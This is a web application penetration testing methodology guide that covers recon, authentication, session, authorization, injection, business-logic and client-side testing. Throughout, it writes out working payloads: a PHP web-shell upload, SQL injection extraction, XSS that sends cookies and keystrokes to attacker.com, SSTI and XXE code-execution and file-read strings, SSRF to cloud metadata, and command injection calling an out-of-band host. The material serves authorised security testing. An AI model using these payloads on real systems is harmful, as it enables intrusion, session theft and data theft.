# Web Application Penetration Testing Methodology

## Table of Contents

1. [The Attacker Mindset](#1-the-attacker-mindset)
2. [Phase 1 — Reconnaissance & Attack Surface Mapping](#2-phase-1--reconnaissance--attack-surface-mapping)
3. [Phase 2 — Configuration & Infrastructure Testing](#3-phase-2--configuration--infrastructure-testing)
4. [Phase 3 — Authentication Testing](#4-phase-3--authentication-testing)
5. [Phase 4 — Session Testing](#5-phase-4--session-testing)
6. [Phase 5 — Authorization Testing](#6-phase-5--authorization-testing)
7. [Phase 6 — Input Testing & Injection](#7-phase-6--input-testing--injection)
8. [Phase 7 — Business Logic Testing](#8-phase-7--business-logic-testing)
9. [Phase 8 — Client-Side Testing](#9-phase-8--client-side-testing)
10. [Phase 9 — Exploitation & Vulnerability Chaining](#10-phase-9--exploitation--vulnerability-chaining)
11. [Phase 10 — Verification & Documentation](#11-phase-10--verification--documentation)
12. [Quick Reference — Decision Trees & Cheat Sheets](#12-quick-reference--decision-trees--cheat-sheets)

---

## 1. The Attacker Mindset

### The Core Rule

**Do not begin exploitation until the application is understood.**

Rushing to test inputs before understanding the application's purpose, architecture, and trust model leads to missed vulnerabilities and wasted time. The most critical vulnerabilities are almost always in the application's logic — not in its generic inputs.

### How to Think About a Target


```
External User (untrusted)
        │
        ▼
Authentication layer     ← can we bypass this?
        │
        ▼
Session / token layer    ← can we forge, steal, or fixate this?
        │
        ▼
Authorization layer      ← can we cross to resources we shouldn't reach?
        │
        ▼
Input processing         ← can we inject into sensitive components?
        │
        ▼
Business logic           ← can we abuse workflow assumptions?
        │
        ▼
Sensitive data / systems ← what is the actual impact?
```

### The Three Questions for Every Finding

```
1. Is this controllable?
   Can I reliably trigger this behavior with crafted input?

2. What trust boundary does this cross?
   Authentication? Authorization? Input validation? Workflow?

3. What is the realistic worst-case impact?
   Account takeover? Data exfiltration? RCE? Privilege escalation?
```

---

## 2. Phase 1 — Reconnaissance & Attack Surface Mapping

### Objective

Build a complete picture of what exists before touching anything. Map every surface before testing any of it.

### 2.1 Passive Reconnaissance (Zero Interaction with Target)

Run all passive recon first — it produces zero noise and often reveals the most valuable targets.

**Certificate Transparency Logs:**
```bash
curl -s "https://crt.sh/?q=target.com&output=json" | \
  jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```
Every subdomain that ever had a certificate is recorded permanently. This often reveals development, staging, and admin hosts that have never been publicly advertised.

**DNS enumeration:**
```bash
# Full record dump — read every record type
dig any target.com

# Key records to analyze:
# MX  → email platform (Google? Self-hosted Exchange?)
# TXT → third-party services via verification tokens
# NS  → hosting provider
# SRV → internal services (_ldap._tcp, _kerberos._tcp)

# SPF record → internal IPs often embedded
dig TXT target.com | grep spf
```

**WHOIS analysis:**
```bash
whois target.com
# Key: registrar, nameservers, creation date, contacts
# Old domain + self-operated NS = mature infrastructure
# Brand new + privacy masked + bulletproof NS = suspicious
```

**Google Dorking:**
```
site:target.com                          # all indexed pages
site:target.com inurl:admin              # admin panels
site:target.com filetype:pdf             # documents
site:target.com (ext:conf OR ext:bak)    # config/backup files
site:target.com intitle:"index of"       # directory listings
site:github.com "target.com" password    # leaked credentials
site:github.com "target.com" api_key
```

**Wayback Machine:**
```bash
# All archived URLs for the domain
curl "http://web.archive.org/cdx/search/cdx?url=target.com/*&output=text&fl=original&collapse=urlkey"

# What to look for:
# - Old admin panels removed from current site but still live
# - Old API versions
# - Previously exposed files
# - Old JS files with hardcoded credentials
```

### 2.2 Subdomain Enumeration

```bash
# Brute force
dnsenum --enum target.com \
  -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -r   # recursive

# Zone transfer attempt (internal networks especially)
dig axfr @ns1.target.com target.com

# Resolve discovered subdomains to IPs
for sub in $(cat subdomains.txt); do
  host $sub.target.com | grep "has address"
done
```

**Priority subdomains to find:**

| Subdomain Pattern | Why It Matters |
|------------------|---------------|
| `dev.*`, `staging.*`, `test.*` | Relaxed security, exposed internals, debug features |
| `admin.*`, `management.*`, `portal.*` | Administrative interfaces |
| `api.*`, `api2.*`, `v1.*`, `v2.*` | API endpoints — often less secured than frontend |
| `internal.*`, `intranet.*` | Internal tools exposed externally |
| `vpn.*`, `remote.*` | Network access points |
| `jenkins.*`, `gitlab.*`, `jira.*` | DevOps infrastructure |
| `mail.*`, `webmail.*` | Email access |
| `backup.*`, `old.*`, `legacy.*` | Outdated/forgotten infrastructure |

### 2.3 Content Discovery

**Directory and file fuzzing:**
```bash
# Directory discovery
gobuster dir \
  -u https://target.com \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,asp,aspx,jsp,txt,html,bak,old,zip,tar.gz,sql,conf,config,env \
  -b 404,403 \
  -o dirs.txt

# API endpoint discovery
gobuster dir \
  -u https://api.target.com \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Backup file discovery (common patterns)
# Append to every discovered file: .bak, .old, .orig, ~, .swp, .1, .copy
```

**Always check:**
```
/robots.txt          → explicitly listed sensitive paths
/sitemap.xml         → complete content map
/.well-known/        → security.txt, openid-configuration
/crossdomain.xml     → Flash CORS policy (legacy but present on old apps)
/.git/               → exposed git repository
/.env                → environment variables (credentials)
/web.config          → IIS configuration
/.htaccess           → Apache configuration
/phpinfo.php         → PHP configuration disclosure
/server-status       → Apache server status
/server-info         → Apache server info
/actuator/           → Spring Boot actuator endpoints
/actuator/env        → environment variables
/actuator/mappings   → all application routes
/swagger-ui.html     → API documentation
/api-docs            → API documentation
/graphql             → GraphQL endpoint
/graphiql            → GraphQL explorer
```

### 2.4 JavaScript Analysis

JavaScript is the most consistently overlooked source of information in web application testing. Modern applications embed their entire routing, API structure, and sometimes credentials directly in JS bundles.

**Discovery:**
```bash
# Extract all JS files from responses
grep -Eo 'src="[^"]+\.js[^"]*"' index.html | cut -d'"' -f2

# Download and analyze each JS file
curl -s https://target.com/js/app.bundle.js | js-beautify > app.js
```

**What to extract from JS:**
```bash
# API endpoints
grep -Eo '["'\'']/api/[^"'\'']+["'\'']' app.js
grep -Eo 'fetch\("[^"]+"\)' app.js

# Hardcoded credentials / tokens
grep -Ei 'api_key|apikey|secret|token|password|credential' app.js

# Internal URLs / hostnames
grep -Eo 'https?://[a-zA-Z0-9._-]+' app.js | sort -u

# AWS / cloud credentials
grep -E 'AKIA[0-9A-Z]{16}' app.js
grep -E 'aws_secret_access_key' app.js

# Hidden parameters and routes
grep -Eo '"[a-zA-Z_-]+":\s*\{[^}]*route' app.js
```

### 2.5 Application Mapping

Before testing, categorize every piece of functionality:

| Category | What to Note |
|----------|-------------|
| Authentication | Login, registration, MFA, password reset, SSO/OAuth |
| Session management | Where tokens live (cookie, localStorage, header), expiry |
| Authorization | What roles exist, what each role can access |
| File operations | Upload, download, display, conversion |
| User data | Profile, settings, account management |
| External integrations | Payment, email, SMS, file storage, APIs |
| Administrative | Admin panel, user management, config, audit logs |
| Search / data retrieval | Query parameters, filters, pagination |
| State-changing operations | Any action that modifies data, sends emails, transfers money |

**For every endpoint discovered, record:**
```
URL:          POST /api/v2/users/profile
Auth:         Required (Bearer token)
Parameters:   user_id (int), email (string), role (string)
Behavior:     Updates user profile
Trust model:  Should only allow users to update their own profile
Test focus:   IDOR (can I update another user's profile?), mass assignment (can I set role=admin?)
```

---

## 3. Phase 2 — Configuration & Infrastructure Testing

### Objective

Find misconfigurations in the server, headers, TLS, and exposed infrastructure before touching application logic.

### 3.1 HTTP Methods

```bash
# Check what methods are supported
curl -X OPTIONS https://target.com/api/users -i
curl -X OPTIONS https://target.com/ -i

# Test dangerous methods
curl -X PUT https://target.com/uploads/shell.php -d '<?php system($_GET["cmd"]); ?>'
curl -X DELETE https://target.com/admin/users/1
curl -X TRACE https://target.com/   # XST vulnerability check
```

### 3.2 Security Headers

```bash
curl -I https://target.com
```

**Headers to check:**

| Header | Secure Value | Missing → Risk |
|--------|-------------|----------------|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | SSL stripping possible |
| `Content-Security-Policy` | Restrictive policy | XSS impact increases |
| `X-Content-Type-Options` | `nosniff` | MIME sniffing attacks |
| `X-Frame-Options` | `DENY` or `SAMEORIGIN` | Clickjacking |
| `Referrer-Policy` | `no-referrer` or `strict-origin` | Information leakage |
| `Permissions-Policy` | Explicit restrictions | Feature abuse |
| `Access-Control-Allow-Origin` | Specific origin, never `*` for credentialed | CORS misconfiguration |

### 3.3 TLS Configuration

```bash
# Check TLS versions and cipher suites
nmap --script ssl-enum-ciphers -p 443 target.com
testssl https://target.com

# What to look for:
# SSLv2, SSLv3, TLS 1.0, TLS 1.1 → deprecated, should be disabled
# RC4, DES, 3DES, EXPORT ciphers → weak
# No forward secrecy (no ECDHE/DHE) → historical sessions decryptable
# Certificate validity and expiry
# Certificate matches the domain (wildcard vs specific)
```

### 3.4 CORS Configuration

```bash
# Test CORS policy
curl -H "Origin: https://evil.com" -I https://target.com/api/user/profile

# Dangerous responses:
# Access-Control-Allow-Origin: https://evil.com  (reflects attacker origin)
# Access-Control-Allow-Origin: *                  (allows any origin)
# Access-Control-Allow-Credentials: true          (combined with above = session theft)

# Test null origin bypass
curl -H "Origin: null" https://target.com/api/data
```

### 3.5 Error Handling

Trigger errors deliberately and record what the application reveals:

```bash
# Cause errors and observe responses
curl https://target.com/api/users/999999999      # non-existent resource
curl https://target.com/api/users/abc            # type mismatch
curl -X POST https://target.com/api/ -d '{bad json'  # malformed input
curl https://target.com/page-that-doesnt-exist   # 404 behavior
```

**Stack traces reveal:**
- Technology stack (Java, Python, PHP, .NET)
- Framework version
- Internal file paths
- Class names and method names
- Database type and query structure

### 3.6 Information Disclosure Sources

```
HTTP response headers     → Server: Apache/2.4.41 (Ubuntu), X-Powered-By: PHP/7.4
HTML comments            → <!-- TODO: remove debug endpoint /api/debug/users -->
JS source maps           → .map files expose original unminified source
Error pages              → Stack traces, internal paths
/robots.txt              → Disallowed paths
Directory listings       → Full file tree exposed
Backup files             → Source code, configs, database dumps
Version files            → CHANGELOG.md, VERSION, package.json
```

---

## 4. Phase 3 — Authentication Testing

### Objective

Determine whether identity verification can be bypassed, circumvented, or manipulated.

### 4.1 Registration Testing

**Username / email enumeration:**
```
Register with:  existing@target.com  → "Email already in use"
Register with:  new@target.com       → "Account created"

→ Timing difference alone (even with identical messages) confirms enumeration
```

**Test for weak registration controls:**
- No email verification → create accounts for any email (prerequisite for account takeover)
- Accept `+` aliases → `victim+1@gmail.com` = same inbox, different account
- Case insensitivity inconsistency → `Admin@target.com` vs `admin@target.com`
- Unicode normalization attacks → `аdmin@target.com` (Cyrillic 'a')

### 4.2 Login Testing

**Username enumeration:**
```
Response to valid username + wrong password:   "Incorrect password"
Response to invalid username + wrong password: "User not found"
→ Different messages = enumeration confirmed

Timing oracle:
Valid username:   response time 450ms (password hash computed)
Invalid username: response time 2ms   (returns immediately, no hash)
→ Timing difference = enumeration via timing
```

**Brute force / lockout testing:**
```bash
# Test lockout threshold — how many attempts before lockout?
# Test if lockout persists or resets
# Test if lockout applies per-IP or per-account
# Test if lockout bypasses exist:

# IP rotation bypass
X-Forwarded-For: 1.2.3.4  (change each request)
X-Real-IP: 1.2.3.4

# Username case variation (treated as different account by lockout, not auth)
admin → Admin → ADMIN → aDmIn

# Distributed brute force — one attempt per account across many accounts
```

**Authentication bypass probes:**
```
# SQL injection in login
username: admin'--
username: ' OR 1=1--
password: anything

# Type juggling (PHP loose comparison)
password: true
password: 0

# Mass assignment — try adding admin: true to registration body
POST /register
{"username": "attacker", "password": "pass", "role": "admin", "isAdmin": true}

# Default credentials — try on admin panels, internal tools
admin:admin, admin:password, admin:123456, root:root
```

### 4.3 Password Reset Testing

**Reset token predictability:**
```
Request reset for account1 → token: abc123def456
Request reset for account2 → token: abc123def457
→ Sequential → predictable → brute-forceable
```

**Host header poisoning:**
```http
POST /forgot-password
Host: attacker.com

username=victim
→ Reset email sent with link: https://attacker.com/reset?token=...
→ Victim clicks → token delivered to attacker
```

**Reset token reuse:**
```
1. Request reset token
2. Use token to reset password
3. Request same URL again → is token still valid?
→ If yes → old tokens never invalidated → token theft window is permanent
```

**Race condition — multiple simultaneous resets:**
```
Send 20 concurrent reset requests for the same account
→ All generate valid tokens → extended attack window
```

### 4.4 Multi-Factor Authentication Testing

```
# MFA bypass attempts:
1. Complete step 1 (password), skip step 2 → directly request authenticated endpoint
2. Complete step 1 as victim, complete step 2 with your own MFA code
3. Brute force 6-digit TOTP (1,000,000 combinations, often no rate limiting on MFA)
4. Reuse a previously valid OTP (check if codes expire or can be replayed)
5. Manipulate response: change {"mfa_required": true} to false in proxy
6. Check backup codes — are they stored in a recoverable way?
```

### 4.5 OAuth / SSO Testing

```
# State parameter missing → CSRF on OAuth flow
# Open redirect in redirect_uri → steal authorization code
# Insufficient redirect_uri validation:
redirect_uri=https://legitimate.com.attacker.com/callback
redirect_uri=https://legitimate.com/callback/../../../attacker.com

# Authorization code reuse
# Token leakage via Referer header
# Implicit flow token in URL fragment (logged, leaked via Referer)
# Account linking without verification → pre-account-takeover
```

---

## 5. Phase 4 — Session Testing

### Objective

Determine whether authentication state can be forged, stolen, fixed, or persisted beyond its intended lifetime.

### 5.1 Session Token Analysis

**Cookie attributes — what to check:**

| Attribute | Should Be Set | Missing → Risk |
|-----------|--------------|----------------|
| `HttpOnly` | Yes | JavaScript can read the cookie → XSS → session theft |
| `Secure` | Yes | Cookie sent over HTTP → network interception |
| `SameSite=Strict/Lax` | Yes | Cross-origin request forgery |
| `Domain` | Narrow (specific host) | Wide domain → subdomains inherit cookie |
| `Path` | Specific | Overly broad path scope |
| `Expires/Max-Age` | Short duration | Long-lived sessions → stolen token remains valid |

**Token entropy analysis:**
```bash
# Collect 10+ session tokens, analyze for patterns
# Decode from base64 if applicable
# Check for predictable components: username, timestamp, sequential ID
# Test: can you decode a token and understand what's inside it?
# If token contains user_id=123 → try user_id=1 (admin)
```

### 5.2 JWT Testing

```bash
# Decode JWT (base64url decode each section)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d

# Attack 1: Algorithm None (remove signature requirement)
# Change alg to "none", remove signature, check if accepted
header: {"alg": "none", "typ": "JWT"}

# Attack 2: RS256 → HS256 confusion
# If server uses RS256, switch to HS256 and sign with the PUBLIC KEY
# Server may verify HMAC using public key as the secret

# Attack 3: Weak secret brute force
# hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# Attack 4: Modify claims without re-signing
# Change "role": "user" to "role": "admin" — does server validate signature?

# Attack 5: kid injection (Key ID header)
# {"kid": "../../dev/null"} → HMAC with empty string
# {"kid": "' UNION SELECT 'attacker_secret'--"} → SQLi in key lookup
```

### 5.3 Session Fixation

```
1. Obtain a session token without authenticating: GET / → Set-Cookie: session=abc123
2. Force victim to use this token (via URL parameter, XSS, etc.)
3. Victim authenticates
4. If session token abc123 is now authenticated → session fixation
→ Mitigation: session token MUST be regenerated on authentication
```

### 5.4 Session Invalidation

```
1. Log in → capture session token
2. Log out
3. Replay the captured token
→ If server still accepts it → logout doesn't invalidate server-side session
→ Stolen tokens remain valid indefinitely after victim logs out
```

### 5.5 CSRF Testing

```
# Identify state-changing requests (POST, PUT, DELETE, PATCH)
# For each, test:

# 1. Remove CSRF token entirely — is request accepted?
# 2. Use empty CSRF token — is request accepted?
# 3. Use another user's CSRF token — is request accepted?
# 4. Change method: POST → GET → does it still work?
# 5. SameSite=None without Secure — is cookie sent cross-origin?

# CSRF token bypass patterns:
# Token tied to session but not to the specific request
# Token validated only if present (omitting it skips validation)
# Token in cookie rather than request body (same-origin doesn't protect this)
# Double-submit cookie pattern with predictable token
```

---

## 6. Phase 5 — Authorization Testing

### Objective

Determine whether access controls correctly enforce the principle of least privilege at every level.

### 6.1 Authorization Testing Setup

Create accounts at every privilege level before testing:
```
Account A: standard user (user_id: 1001)
Account B: standard user (user_id: 1002)
Account C: premium/elevated user
Account D: admin (if accessible)
```

Document all resources owned by each account. Test cross-account access systematically.

### 6.2 Horizontal Authorization (IDOR)

Can User A access User B's resources?

**ID types to test:**

| ID Type | Test Approach |
|---------|-------------|
| Sequential integers | `user_id=1001` → try `1000`, `1002`, `1003` |
| UUIDs | Obtain other users' UUIDs via information disclosure, then access their resources |
| Hashed IDs | Decode the hash scheme, hash another user's ID |
| Indirect references | `profile` → whose profile? Try `profile?user=victim` |
| GUIDs in URLs | Look for GUIDs in emails, links, API responses — try them cross-account |

**Where IDOR surfaces:**
```
GET  /api/users/{id}/profile        → read another user's data
GET  /api/orders/{id}               → read another user's orders
PUT  /api/users/{id}/email          → modify another user's email
DELETE /api/messages/{id}           → delete another user's content
GET  /api/documents/{filename}      → path traversal in filename
POST /api/admin/users               → with user_id parameter in body
```

**Non-obvious IDOR:**
```
# IDOR in file download
GET /download?file=user_1001_invoice.pdf
→ Try: /download?file=user_1002_invoice.pdf

# IDOR via JSON parameter
POST /api/update-profile
{"user_id": 1001, "email": "newemail@test.com"}
→ Try: {"user_id": 1002, "email": "newemail@test.com"}

# Second-order IDOR
POST /api/share-document
{"doc_id": 5, "share_with": "userB"}
→ Try doc_id values that belong to other users
```

### 6.3 Vertical Authorization (Privilege Escalation)

Can a low-privilege user access high-privilege functionality?

```
# Method 1: Access admin endpoints directly with user token
GET /admin/users        Authorization: Bearer user_token
GET /admin/config       Authorization: Bearer user_token
POST /admin/delete      Authorization: Bearer user_token

# Method 2: Parameter manipulation
POST /api/update-role
{"user_id": attacker_id, "role": "admin"}

# Method 3: Mass assignment
PUT /api/user/profile
{"name": "attacker", "isAdmin": true, "role": "superuser"}

# Method 4: HTTP method override
POST /admin/delete
X-HTTP-Method-Override: GET
→ Some access controls only check specific HTTP methods

# Method 5: Force browsing
# Access admin URLs directly without following normal navigation flow
```

### 6.4 Function-Level Authorization

Test every function individually — authorization is often applied at the page level but not at the API level:

```
Frontend check:    "Admin" menu item hidden from users → not visible
API check:         POST /api/admin/create-user → no authorization check → accepts user token

Test pattern:
1. As admin: perform the action, capture the API request
2. As user: replay the exact same API request with user's session token
3. If it succeeds → function-level authorization missing
```

---

## 7. Phase 6 — Input Testing & Injection

### Objective

Determine whether user-controlled input reaches sensitive components without adequate sanitization.

### 7.1 Input Mapping — Before Testing

For every input, trace the full path:

```
Input (parameter, header, cookie, file)
        ↓
What does the application do with it?
        ↓
Does it reach a sensitive component?

Sensitive components:
├── Database         → SQL Injection / NoSQL Injection
├── Browser          → XSS
├── OS               → Command Injection
├── Template Engine  → SSTI
├── XML Parser       → XXE
├── URL Fetcher      → SSRF
├── File System      → Path Traversal / File Inclusion
├── Deserializer     → Insecure Deserialization
└── HTTP Headers     → Header Injection / Request Smuggling
```

### 7.2 SQL Injection Probes

```sql
-- Detection probes (try in every parameter)
'                   → syntax error?
''                  → error resolves?
' OR 1=1--          → returns more data?
' AND 1=2--         → returns less data?
' AND SLEEP(5)--    → 5 second delay? (blind)

-- Confirm injectable
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY N--      → error when N exceeds column count

-- UNION extraction
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT @@version,NULL--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT username,password FROM users--
```

### 7.3 XSS Probes

```html
<!-- Basic detection -->
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)

<!-- Attribute context -->
" onmouseover="alert(1)
' onmouseover='alert(1)

<!-- DOM XSS (check JS source for sinks) -->
document.write(location.hash)
element.innerHTML = userInput
eval(userInput)
setTimeout(userInput)

<!-- CSP bypass -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input autofocus onfocus=alert(1)>

<!-- Impact escalation beyond alert -->
<!-- Session theft -->
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
<!-- Keylogger -->
<script>document.onkeypress=function(e){fetch('https://attacker.com/?k='+e.key)}</script>
```

### 7.4 SSRF Probes

```bash
# In every URL parameter, webhook, import-from-URL, image-from-URL feature:
http://localhost/admin
http://127.0.0.1/admin
http://169.254.169.254/latest/meta-data/   # AWS metadata
http://192.168.0.1/admin                    # internal network

# Blind SSRF detection (use OAST)
http://your-oast-server.com

# Protocol switching
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO    # Redis via Gopher
dict://127.0.0.1:6379/INFO       # Redis via DICT
```

### 7.5 Command Injection Probes

```bash
# In every OS-level operation (ping, nslookup, file conversion, PDF gen):
; id
| id
& id
`id`
$(id)
; sleep 5
| sleep 5

# Blind detection via DNS callback
; nslookup your-oast-server.com
| curl http://your-oast-server.com
```

### 7.6 SSTI Probes

```python
# Detection — inject math expressions:
{{7*7}}          → if 49 appears in output → Jinja2/Twig
${7*7}           → if 49 appears → Freemarker/Thymeleaf
<%= 7*7 %>       → if 49 appears → ERB (Ruby)
#{7*7}           → if 49 appears → Ruby interpolation

# Jinja2/Twig RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### 7.7 XXE Probes

```xml
<!-- In any XML input, SVG upload, DOCX/XLSX upload, SOAP endpoint: -->

<!-- File read -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

<!-- SSRF via XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<data>&xxe;</data>

<!-- Blind XXE via OOB -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://your-oast-server.com/"> %xxe;]>
```

### 7.8 Path Traversal Probes

```
# In file download, include, template parameters:
../../../etc/passwd
....//....//....//etc/passwd       # non-recursive strip bypass
/etc/passwd                        # absolute path bypass
..%2f..%2f..%2fetc%2fpasswd        # URL encoded
..%252f..%252f..%252fetc/passwd    # double URL encoded
../../../etc/passwd%00.png         # null byte bypass
/var/www/images/../../../etc/passwd # prefix bypass
```

---

## 8. Phase 7 — Business Logic Testing

### Objective

Identify vulnerabilities that exist in the application's workflows and assumptions rather than in its technical input handling.

### 8.1 Workflow Analysis

Map every multi-step process in the application:

```
For each workflow, ask:
1. What order are the steps expected to occur?
2. What happens if steps are skipped?
3. What happens if steps are repeated?
4. What happens if steps are performed in reverse order?
5. What data is assumed to be consistent between steps?
6. What server-side state persists between steps?
```

**Common workflow assumptions to challenge:**

| Assumption | Test |
|------------|------|
| Step 1 must complete before Step 2 | Send Step 2 request without completing Step 1 |
| Price is fixed at display time | Change price parameter in POST request |
| Quantity must be positive | Submit negative quantity |
| Coupon can only be used once | Apply coupon, remove from cart, re-apply |
| Discount applies once per order | Stack multiple discounts via race condition |
| Payment must precede delivery | Complete checkout, capture order ID, skip payment step |

### 8.2 Race Conditions

```
# Identify race condition candidates:
# - Any action that should only happen once (coupon use, referral credit, free trial)
# - Any check-then-act sequence (check balance → deduct → process)
# - Any counter-based limit (rate limits, daily limits)

# Test: send 20+ identical requests simultaneously
import asyncio, aiohttp

async def send_request(session):
    return await session.post('https://target.com/api/redeem-coupon',
                              json={'code': 'FREEMONTH'},
                              headers={'Authorization': 'Bearer token'})

async def race():
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session) for _ in range(20)]
        results = await asyncio.gather(*tasks)
        for r in results:
            print(await r.json())

asyncio.run(race())
```

### 8.3 Financial Logic

```
# Price manipulation
POST /cart/add
{"item_id": 1, "price": 0.01}   # attacker-controlled price

# Negative quantity → negative charge
POST /cart/add
{"item_id": 1, "quantity": -1}

# Integer overflow
{"quantity": 2147483648}        # max int32 → wraps to negative

# Currency conversion confusion
# Submit amount in one currency, credited in another
{"amount": 100, "currency": "JPY"}  # system converts to USD: $0.67

# Free item via returns
# Buy item → return for credit → credit exceeds original cost

# Coupon stacking
# Apply coupon, remove item, add item back, re-apply coupon
```

---

## 9. Phase 8 — Client-Side Testing

### Objective

Identify vulnerabilities that execute in the victim's browser.

### 9.1 DOM XSS

```javascript
// Sources (where attacker-controlled data enters):
location.hash
location.search
location.href
document.referrer
document.cookie
window.name
postMessage data

// Sinks (where data causes execution):
document.write()
element.innerHTML
element.outerHTML
eval()
setTimeout(string)
setInterval(string)
Function(string)
location = userInput
location.href = userInput
element.src = userInput

// Testing approach:
// 1. Search JS source for sinks
// 2. Trace data flow from source to sink
// 3. Inject payload into source, trigger the code path, observe sink execution
```

### 9.2 Prototype Pollution

```javascript
// Detection — inject into query parameters or JSON:
?__proto__[test]=polluted
?constructor[prototype][test]=polluted

// In JSON body:
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}

// Confirm: check if Object.prototype.test === 'polluted' is true
// Impact: if application checks obj.isAdmin without hasOwnProperty, pollution works
```

### 9.3 Clickjacking

```html
<!-- Test: can the page be embedded in an iframe? -->
<iframe src="https://target.com/account/delete" width="500" height="500"></iframe>

<!-- Vulnerable if page loads in iframe -->
<!-- Exploit: transparent iframe over attacker-controlled page, trick user into clicking -->

<!-- Check X-Frame-Options and CSP frame-ancestors header -->
```

### 9.4 postMessage Testing

```javascript
// Find all message event listeners in JS source
window.addEventListener('message', function(event) {
    // Does it validate event.origin?
    // Does it pass event.data to a dangerous sink?
});

// Test: send message from attacker-controlled page
window.open('https://target.com');
// After load:
targetWindow.postMessage('javascript:alert(1)', '*');
targetWindow.postMessage({'action': 'navigate', 'url': 'javascript:alert(1)'}, '*');
```

### 9.5 WebSockets

```
# Intercept WebSocket handshake
# Test: does the WS endpoint check authentication?
# Test: can you send messages as other users?
# Test: inject XSS payloads in WS messages
# Test: does WS bypass CSRF protections applied to HTTP endpoints?
```

---

## 10. Phase 9 — Exploitation & Vulnerability Chaining

### Objective

Transform confirmed vulnerabilities into demonstrated impact. Combine findings where possible to escalate.

### 10.1 Impact Escalation Ladder

```
For each confirmed vulnerability, escalate to maximum demonstrated impact:

Low:     Information disclosure
Medium:  Authentication bypass, unauthorized data access
High:    Account takeover, privilege escalation, sensitive data exfiltration
Critical: RCE, full system compromise, domain-wide access
```

### 10.2 Common Vulnerability Chains

```
Chain 1: Information Disclosure → Account Takeover
IDOR → read another user's password reset token → takeover

Chain 2: Self-XSS → Reflected XSS → Stored XSS
Self-XSS in profile field → CSRF to force victim to submit form → stored XSS on victim's page

Chain 3: SSRF → Internal Access → RCE
SSRF → reach internal Jenkins → exploit unauthenticated Jenkins API → execute build → RCE

Chain 4: Subdomain Takeover → Session Theft
Unclaimed CNAME → take over subdomain → host malicious page at legitimate subdomain
→ Cookie scoped to *.target.com delivered to attacker's subdomain → session theft

Chain 5: IDOR + Mass Assignment → Privilege Escalation
IDOR to read another user's ID → mass assignment to set that ID's role to admin

Chain 6: Open Redirect → OAuth Token Theft
OAuth redirect_uri validation bypass via open redirect
→ Authorization code delivered to attacker URL via redirect chain

Chain 7: XSS + CSRF Token Leak → CSRF Bypass
XSS to read CSRF token from page DOM → use token in forged CSRF request

Chain 8: Blind SSRF + Internal Vulnerability
Blind SSRF → target internal Redis → write Redis key → trigger RCE via Redis config abuse
```

### 10.3 Account Takeover Paths

```
1. Password reset poisoning → capture reset token → reset password
2. IDOR → read/modify email address → trigger reset → control inbox → takeover
3. IDOR → read session token → replay session
4. XSS → steal session cookie → replay session
5. OAuth misconfiguration → steal authorization code → exchange for access token
6. JWT manipulation → forge admin token → access admin functions
7. Mass assignment → set isAdmin=true → elevate own account
8. MFA bypass → complete authentication without OTP
```

---

## 11. Phase 10 — Verification & Documentation

### Objective

Confirm every finding is real, reproducible, and clearly documented.

### 11.1 Verification Checklist

For every finding before documenting:

```
□ Reproduced at least 3 times consistently
□ Tested with a clean session (no residual state from earlier testing)
□ Confirmed the root cause (not just the symptom)
□ Determined the realistic worst-case impact
□ Verified it is not a duplicate of another finding
□ Confirmed it is within scope
```

### 11.2 Finding Documentation Template

```markdown
## [SEVERITY] — [Vulnerability Type] in [Component]

**Severity:** Critical / High / Medium / Low / Informational
**CWE:** CWE-XXX
**CVSS:** X.X (if applicable)

### Summary
One paragraph: what the vulnerability is, where it exists, what an attacker can do.

### Technical Details
Exact reproduction steps:

1. Navigate to [URL]
2. Send the following request:

[Request block]

3. Observe [response indicating vulnerability]

### Proof of Concept
[Screenshot or response demonstrating impact]

### Impact
What an attacker can achieve. Be specific — not "data access" but
"an unauthenticated attacker can read the name, email, address, and payment
card last four digits of any registered user by iterating the numeric user_id
parameter in GET /api/users/{id}/profile."

### Remediation
Root cause fix + implementation guidance + code example where applicable.
```

---

## 12. Quick Reference — Decision Trees & Cheat Sheets

### Phase Decision Flow

```
START
  │
  ▼
Phase 1: Recon         → Map everything before touching anything
  │
  ▼
Phase 2: Config        → Low-hanging fruit first (headers, methods, errors)
  │
  ▼
Phase 3: Auth          → Can I get in without valid credentials?
  │
  ▼
Phase 4: Session       → Can I maintain/steal/forge authentication state?
  │
  ▼
Phase 5: Authorization → Can I access things I shouldn't?
  │
  ▼
Phase 6: Injection     → Can I inject into sensitive components?
  │
  ▼
Phase 7: Business Logic → Can I abuse the application's rules?
  │
  ▼
Phase 8: Client-Side   → Can I execute code in victim browsers?
  │
  ▼
Phase 9: Chain         → Can I combine findings for higher impact?
  │
  ▼
Phase 10: Verify + Document
```

### Input → Component → Vulnerability Mapping

| Input Reaches | Primary Vulnerability | Secondary |
|---------------|----------------------|-----------|
| SQL query | SQL Injection | Auth bypass, data exfiltration |
| HTML response | XSS (Reflected/Stored) | Session theft, phishing |
| OS command | Command Injection | RCE |
| Template engine | SSTI | RCE |
| XML parser | XXE | File read, SSRF |
| URL fetcher | SSRF | Internal access, cloud metadata |
